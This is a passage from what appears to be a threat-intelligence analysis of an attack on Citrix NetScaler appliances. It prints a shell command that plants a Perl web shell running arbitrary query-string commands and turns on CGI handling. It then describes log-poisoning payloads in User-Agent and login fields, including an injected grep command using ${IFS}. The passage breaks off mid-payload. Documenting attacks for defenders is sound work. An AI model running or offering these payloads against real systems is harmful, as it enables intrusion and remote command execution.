printf "#!/usr/bin/perl\nprint "Content-Type: text/plain\r\n\r\n";print "Nx-zD|";if($ENV{QUERY_STRING}=~/0=(.*)/){print `$1`;}print "|";" &gt; /var/netscaler/gui/admin_ui/apex/Nx_7508.pl; chmod 755 /var/netscaler/gui/admin_ui/apex/Nx_7508.pl; 

# Enable PHP + Perl CGI, reload Apache
sed -i '' 's/php_engine off/php_engine on/g' /etc/httpd.conf;
grep -q 'AddHandler cgi-script .pl' /etc/httpd.conf || echo 'AddHandler cgi-script .pl' &gt;&gt; /etc/httpd.conf;
kill -HUP $(cat /var/run/httpd.pid)The same Base64-encoded payload in the User-Agent field was sent to multiple paths. This increased the likelihood that it would be written to the HTTP access log file and remain available when the trigger executed.At this stage, the payload in the User-Agent value was not executed. Instead, the log served as storage for the attacker-controlled payload. Step 2: Poisoning the authentication logThe attacker then sent POST requests to the following authentication endpoints, as observed by ThreatLabz:/nf/auth/doAuthentication.do
/cgi/loginThe attacker-controlled login value impersonated a NetScaler Packet Processing Engine (PPE) failure record. ThreatLabz observed two variants:Variant 1:pitboss PPE missed too many 
heartbeatsNSPPE;grep${IFS}INDEX:${IFS}/var/log/htt*|
